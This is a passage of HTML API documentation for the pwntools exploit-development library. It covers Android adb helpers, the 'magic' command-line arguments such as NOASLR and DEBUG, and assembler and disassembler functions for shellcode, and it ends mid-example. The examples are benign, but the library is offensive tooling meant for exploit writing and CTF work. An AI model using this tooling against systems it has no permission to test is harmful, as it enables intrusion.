<dt id="pwnlib.adb.adb.uptime">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">uptime</code><span class="sig-paren">(</span><span class="sig-paren">)</span> &#x2192; float<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.uptime" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">Uptime of the device, in seconds</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.wait_for_device">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">wait_for_device</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.wait_for_device" title="Permalink to this definition">¶</a></dt>
<dd><p>Waits for a device to be connected.</p>
<p>By default, waits for the currently-selected device (via <code class="docutils literal"><span class="pre">context.device</span></code>).
To wait for a specific device, set <code class="docutils literal"><span class="pre">context.device</span></code>.
To wait for <em>any</em> device, clear <code class="docutils literal"><span class="pre">context.device</span></code>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">An <code class="docutils literal"><span class="pre">AdbDevice</span></code> instance for the device.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">device</span> <span class="o">=</span> <span class="n">adb</span><span class="o">.</span><span class="n">wait_for_device</span><span class="p">()</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.which">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">which</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.which" title="Permalink to this definition">¶</a></dt>
<dd><p>Retrieves the full path to a binary in <code class="docutils literal"><span class="pre">$PATH</span></code> on the device</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>name</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Binary name</li>
<li><strong>all</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Whether to return all paths, or just the first</li>
<li><strong>*a</strong> &#8211; Additional arguments for <a class="reference internal" href="#pwnlib.adb.adb.process" title="pwnlib.adb.adb.process"><code class="xref py py-func docutils literal"><span class="pre">adb.process()</span></code></a></li>
<li><strong>**kw</strong> &#8211; Additional arguments for <a class="reference internal" href="#pwnlib.adb.adb.process" title="pwnlib.adb.adb.process"><code class="xref py py-func docutils literal"><span class="pre">adb.process()</span></code></a></li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">Either a path, or list of paths</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">which</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
<span class="go">&#39;/system/bin/sh&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">which</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="nb">all</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="go">[&#39;/system/bin/sh&#39;]</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">which</span><span class="p">(</span><span class="s1">&#39;foobar&#39;</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">which</span><span class="p">(</span><span class="s1">&#39;foobar&#39;</span><span class="p">,</span> <span class="nb">all</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="go">[]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.write">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">write</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L547-553"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.write" title="Permalink to this definition">¶</a></dt>
<dd><p>Create a file on the device with the provided contents.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>path</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to the file on the device</li>
<li><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Contents to store in the file</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;/dev/null&#39;</span><span class="p">,</span> <span class="s1">&#39;data&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;/data/local/tmp/&#39;</span><span class="p">)</span>
</pre></div>
</div>
</dd></dl>

</div>
<span class="target" id="module-pwnlib.adb.protocol"></span><p>This file exists only for backward compatibility</p>
</div>
<span id="document-args"></span><div class="section" id="module-pwnlib.args">
<span id="pwnlib-args-magic-command-line-arguments"></span><h3><a class="reference internal" href="#module-pwnlib.args" title="pwnlib.args"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.args</span></code></a> &#8212; Magic Command-Line Arguments<a class="headerlink" href="#module-pwnlib.args" title="Permalink to this headline">¶</a></h3>
<p>Pwntools exposes several magic command-line arguments and environment
variables when operating in <cite>from pwn import *</cite> mode.</p>
<p>The arguments extracted from the command-line and removed from <code class="docutils literal"><span class="pre">sys.argv</span></code>.</p>
<p>Arguments can be set by appending them to the command-line, or setting
them in the environment prefixed by <code class="docutils literal"><span class="pre">PWNLIB_</span></code>.</p>
<p>The easiest example is to enable more verbose debugging.  Just set <code class="docutils literal"><span class="pre">DEBUG</span></code>.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>$ <span class="nv">PWNLIB_DEBUG</span><span class="o">=</span><span class="m">1</span> python exploit.py
$ python exploit.py DEBUG
</pre></div>
</div>
<p>These arguments are automatically extracted, regardless of their name, and
exposed via <code class="xref py py-mod docutils literal"><span class="pre">pwnlib.args.args</span></code>, which is exposed as the global variable
<code class="xref py py-data docutils literal"><span class="pre">args</span></code>.  Arguments which <code class="docutils literal"><span class="pre">pwntools</span></code> reserves internally are not exposed
this way.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>$ python -c <span class="s1">&#39;from pwn import *; print args&#39;</span> <span class="nv">A</span><span class="o">=</span><span class="m">1</span> <span class="nv">B</span><span class="o">=</span>Hello <span class="nv">HOST</span><span class="o">=</span><span class="m">1</span>.2.3.4 DEBUG
defaultdict<span class="o">(</span>&lt;<span class="nb">type</span> <span class="s1">&#39;str&#39;</span>&gt;, <span class="o">{</span><span class="s1">&#39;A&#39;</span>: <span class="s1">&#39;1&#39;</span>, <span class="s1">&#39;HOST&#39;</span>: <span class="s1">&#39;1.2.3.4&#39;</span>, <span class="s1">&#39;B&#39;</span>: <span class="s1">&#39;Hello&#39;</span><span class="o">})</span>
</pre></div>
</div>
<p>This is very useful for conditional code, for example determining whether to
run an exploit locally or to connect to a remote server.  Arguments which are
not specified evaluate to an empty string.</p>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;exploitme.com&#39;</span><span class="p">,</span> <span class="mi">4141</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwnable&#39;</span><span class="p">)</span>
</pre></div>
</div>
<p>Arguments can also be accessed directly with the dot operator, e.g.:</p>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
    <span class="o">...</span>
</pre></div>
</div>
<p>Any undefined arguments evaluate to an empty string, <code class="docutils literal"><span class="pre">''</span></code>.</p>
<p>The full list of supported &#8220;magic arguments&#8221; and their effects are listed
below.</p>
<dl class="function">
<dt id="pwnlib.args.DEBUG">
<code class="descclassname">pwnlib.args.</code><code class="descname">DEBUG</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/args.py#L128-131"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.args.DEBUG" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets the logging verbosity to <code class="docutils literal"><span class="pre">debug</span></code> which displays much
more information, including logging each byte sent by tubes.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.args.LOG_FILE">
<code class="descclassname">pwnlib.args.</code><code class="descname">LOG_FILE</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/args.py#L118-121"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.args.LOG_FILE" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets a log file to be used via <code class="docutils literal"><span class="pre">context.log_file</span></code>, e.g.
<code class="docutils literal"><span class="pre">LOG_FILE=./log.txt</span></code></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.args.LOG_LEVEL">
<code class="descclassname">pwnlib.args.</code><code class="descname">LOG_LEVEL</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/args.py#L111-116"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.args.LOG_LEVEL" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets the logging verbosity used via <code class="docutils literal"><span class="pre">context.log_level</span></code>,
e.g. <code class="docutils literal"><span class="pre">LOG_LEVEL=debug</span></code>.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.args.NOASLR">
<code class="descclassname">pwnlib.args.</code><code class="descname">NOASLR</code><span class="sig-paren">(</span><em>v</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/args.py#L148-150"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.args.NOASLR" title="Permalink to this definition">¶</a></dt>
<dd><p>Disables ASLR via <code class="docutils literal"><span class="pre">context.aslr</span></code></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.args.NOPTRACE">
<code class="descclassname">pwnlib.args.</code><code class="descname">NOPTRACE</code><span class="sig-paren">(</span><em>v</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/args.py#L152-155"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.args.NOPTRACE" title="Permalink to this definition">¶</a></dt>
<dd><p>Disables facilities which require <code class="docutils literal"><span class="pre">ptrace</span></code> such as <code class="docutils literal"><span class="pre">gdb.attach()</span></code>
statements, via <code class="docutils literal"><span class="pre">context.noptrace</span></code>.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.args.NOTERM">
<code class="descclassname">pwnlib.args.</code><code class="descname">NOTERM</code><span class="sig-paren">(</span><em>v</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/args.py#L133-137"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.args.NOTERM" title="Permalink to this definition">¶</a></dt>
<dd><p>Disables pretty terminal settings and animations.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.args.RANDOMIZE">
<code class="descclassname">pwnlib.args.</code><code class="descname">RANDOMIZE</code><span class="sig-paren">(</span><em>v</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/args.py#L144-146"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.args.RANDOMIZE" title="Permalink to this definition">¶</a></dt>
<dd><p>Enables randomization of various pieces via <code class="docutils literal"><span class="pre">context.randomize</span></code></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.args.SILENT">
<code class="descclassname">pwnlib.args.</code><code class="descname">SILENT</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/args.py#L123-126"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.args.SILENT" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets the logging verbosity to <code class="docutils literal"><span class="pre">error</span></code> which silences most
output.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.args.STDERR">
<code class="descclassname">pwnlib.args.</code><code class="descname">STDERR</code><span class="sig-paren">(</span><em>v</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/args.py#L157-159"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.args.STDERR" title="Permalink to this definition">¶</a></dt>
<dd><p>Sends logging to <code class="docutils literal"><span class="pre">stderr</span></code> by default, instead of <code class="docutils literal"><span class="pre">stdout</span></code></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.args.TIMEOUT">
<code class="descclassname">pwnlib.args.</code><code class="descname">TIMEOUT</code><span class="sig-paren">(</span><em>v</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/args.py#L139-142"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.args.TIMEOUT" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets a timeout for tube operations (in seconds) via
<code class="docutils literal"><span class="pre">context.timeout</span></code>, e.g. <code class="docutils literal"><span class="pre">TIMEOUT=30</span></code></p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.args.asbool">
<code class="descclassname">pwnlib.args.</code><code class="descname">asbool</code><span class="sig-paren">(</span><em>s</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/args.py#L98-109"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.args.asbool" title="Permalink to this definition">¶</a></dt>
<dd><p>Convert a string to its boolean value</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.args.isident">
<code class="descclassname">pwnlib.args.</code><code class="descname">isident</code><span class="sig-paren">(</span><em>s</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/args.py#L83-96"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.args.isident" title="Permalink to this definition">¶</a></dt>
<dd><p>Helper function to check whether a string is a valid identifier,
as passed in on the command-line.</p>
</dd></dl>

</div>
<span id="document-asm"></span><div class="section" id="module-pwnlib.asm">
<span id="pwnlib-asm-assembler-functions"></span><h3><a class="reference internal" href="#module-pwnlib.asm" title="pwnlib.asm"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.asm</span></code></a> &#8212; Assembler functions<a class="headerlink" href="#module-pwnlib.asm" title="Permalink to this headline">¶</a></h3>
<p>Utilities for assembling and disassembling code.</p>
<div class="section" id="architecture-selection">
<h4>Architecture Selection<a class="headerlink" href="#architecture-selection" title="Permalink to this headline">¶</a></h4>
<blockquote>
<div><p>Architecture, endianness, and word size are selected by using <a class="reference internal" href="index.html#module-pwnlib.context" title="pwnlib.context"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.context</span></code></a>.</p>
<p>Any parameters which can be specified to <code class="docutils literal"><span class="pre">context</span></code> can also be specified as
keyword arguments to either <a class="reference internal" href="#pwnlib.asm.asm" title="pwnlib.asm.asm"><code class="xref py py-func docutils literal"><span class="pre">asm()</span></code></a> or <a class="reference internal" href="#pwnlib.asm.disasm" title="pwnlib.asm.disasm"><code class="xref py py-func docutils literal"><span class="pre">disasm()</span></code></a>.</p>
</div></blockquote>
</div>
<div class="section" id="assembly">
<h4>Assembly<a class="headerlink" href="#assembly" title="Permalink to this headline">¶</a></h4>
<blockquote>
<div><p>To assemble code, simply invoke <a class="reference internal" href="#pwnlib.asm.asm" title="pwnlib.asm.asm"><code class="xref py py-func docutils literal"><span class="pre">asm()</span></code></a> on the code to assemble.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov eax, 0&#39;</span><span class="p">)</span>
<span class="go">&#39;\xb8\x00\x00\x00\x00&#39;</span>
</pre></div>
</div>
<p>Additionally, you can use constants as defined in the <a class="reference internal" href="index.html#module-pwnlib.constants" title="pwnlib.constants"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.constants</span></code></a>
module.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov eax, SYS_execve&#39;</span><span class="p">)</span>
<span class="go">&#39;\xb8\x0b\x00\x00\x00&#39;</span>
</pre></div>
</div>
<p>Finally, <a class="reference internal" href="#pwnlib.asm.asm" title="pwnlib.asm.asm"><code class="xref py py-func docutils literal"><span class="pre">asm()</span></code></a> is used to assemble shellcode provided by <code class="docutils literal"><span class="pre">pwntools</span></code>
in the <code class="xref py py-mod docutils literal"><span class="pre">shellcraft</span></code> module.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">nop</span><span class="p">())</span>
<span class="go">&#39;\x90&#39;</span>
</pre></div>
</div>
</div></blockquote>
</div>
<div class="section" id="disassembly">
<h4>Disassembly<a class="headerlink" href="#disassembly" title="Permalink to this headline">¶</a></h4>
<blockquote>
<div><p>To disassemble code, simply invoke <a class="reference internal" href="#pwnlib.asm.disasm" title="pwnlib.asm.disasm"><code class="xref py py-func docutils literal"><span class="pre">disasm()</span></code></a> on the bytes to disassemble.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">disasm</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xb8\x0b\x00\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="go">&#39;   0:   b8 0b 00 00 00          mov    eax,0xb&#39;</span>
</pre></div>
</div>
</div></blockquote>
<dl class="function">
<dt id="pwnlib.asm.asm">
<code class="descclassname">pwnlib.asm.</code><code class="descname">asm</code><span class="sig-paren">(</span><em>code</em>, <em>vma = 0</em>, <em>extract = True</em>, <em>shared = False</em>, <em>...</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/asm.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.asm.asm" title="Permalink to this definition">¶</a></dt>
<dd><p>Runs <a class="reference internal" href="#pwnlib.asm.cpp" title="pwnlib.asm.cpp"><code class="xref py py-func docutils literal"><span class="pre">cpp()</span></code></a> over a given shellcode and then assembles it into bytes.</p>
<p>To see which architectures or operating systems are supported,
look in <code class="xref py py-mod docutils literal"><span class="pre">pwnlib.contex</span></code>.</p>
<p>Assembling shellcode requires that the GNU assembler is installed
for the target architecture.
See <a class="reference internal" href="index.html#document-install/binutils"><span class="doc">Installing Binutils</span></a> for more information.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>shellcode</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Assembler code to assemble.</li>
<li><strong>vma</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Virtual memory address of the beginning of assembly</li>
<li><strong>extract</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Extract the raw assembly bytes from the assembled
file.  If <code class="xref py py-const docutils literal"><span class="pre">False</span></code>, returns the path to an ELF file
with the assembly embedded.</li>
<li><strong>shared</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Create a shared object.</li>
<li><strong>kwargs</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Any attributes on <a class="reference internal" href="index.html#pwnlib.context.context" title="pwnlib.context.context"><code class="xref py py-data docutils literal"><span class="pre">context</span></code></a> can be set, e.g.set
<code class="docutils literal"><span class="pre">arch='arm'</span></code>.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">asm</span><span class="p">(</span><span class="s2">&quot;mov eax, SYS_select&quot;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;freebsd&#39;</span><span class="p">)</span>
<span class="go">&#39;\xb8]\x00\x00\x00&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">asm</span><span class="p">(</span><span class="s2">&quot;mov eax, SYS_select&quot;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
<span class="go">&#39;\xb8\x17\x00\x00\x00&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">asm</span><span class="p">(</span><span class="s2">&quot;mov rax, SYS_select&quot;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
<span class="go">&#39;H\xc7\xc0\x17\x00\x00\x00&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">asm</span><span class="p">(</span><span class="s2">&quot;mov r0, #SYS_select&quot;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;arm&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">bits</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span>
<span class="go">&#39;R\x00\xa0\xe3&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.asm.cpp">
<code class="descclassname">pwnlib.asm.</code><code class="descname">cpp</code><span class="sig-paren">(</span><em>shellcode</em>, <em>...</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/asm.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.asm.cpp" title="Permalink to this definition">¶</a></dt>
<dd><p>Runs CPP over the given shellcode.</p>
<p>The output will always contain exactly one newline at the end.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>shellcode</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Shellcode to preprocess</td>
</tr>
</tbody>
</table>
<dl class="docutils">
<dt>Kwargs:</dt>
<dd>Any arguments/properties that can be set on <code class="docutils literal"><span class="pre">context</span></code></dd>
</dl>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">cpp</span><span class="p">(</span><span class="s2">&quot;mov al, SYS_setresuid&quot;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s2">&quot;i386&quot;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s2">&quot;linux&quot;</span><span class="p">)</span>
<span class="go">&#39;mov al, 164\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">cpp</span><span class="p">(</span><span class="s2">&quot;weee SYS_setresuid&quot;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s2">&quot;arm&quot;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s2">&quot;linux&quot;</span><span class="p">)</span>
<span class="go">&#39;weee (0+164)\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">cpp</span><span class="p">(</span><span class="s2">&quot;SYS_setresuid&quot;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s2">&quot;thumb&quot;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s2">&quot;linux&quot;</span><span class="p">)</span>
<span class="go">&#39;(0+164)\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">cpp</span><span class="p">(</span><span class="s2">&quot;SYS_setresuid&quot;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s2">&quot;freebsd&quot;</span><span class="p">)</span>
<span class="go">&#39;311\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.asm.disasm">
<code class="descclassname">pwnlib.asm.</code><code class="descname">disasm</code><span class="sig-paren">(</span><em>data</em>, <em>...</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/asm.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.asm.disasm" title="Permalink to this definition">¶</a></dt>
<dd><p>Disassembles a bytestring into human readable assembler.</p>
<p>To see which architectures are supported,
look in <code class="xref py py-mod docutils literal"><span class="pre">pwnlib.contex</span></code>.</p>
<p>To support all these architecture, we bundle the GNU objcopy
and objdump with pwntools.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Bytestring to disassemble.</li>
<li><strong>vma</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Passed through to the &#8211;adjust-vma argument of objdump</li>
<li><strong>byte</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Include the hex-printed bytes in the disassembly</li>
<li><strong>offset</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Include the virtual memory address in the disassembly</li>
</ul>
</td>
</tr>
</tbody>
</table>
<dl class="docutils">
<dt>Kwargs:</dt>
<dd>Any arguments/properties that can be set on <code class="docutils literal"><span class="pre">context</span></code></dd>
</dl>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">disasm</span><span class="p">(</span><span class="s1">&#39;b85d000000&#39;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">),</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
<span class="go">   0:   b8 5d 00 00 00          mov    eax,0x5d</span>
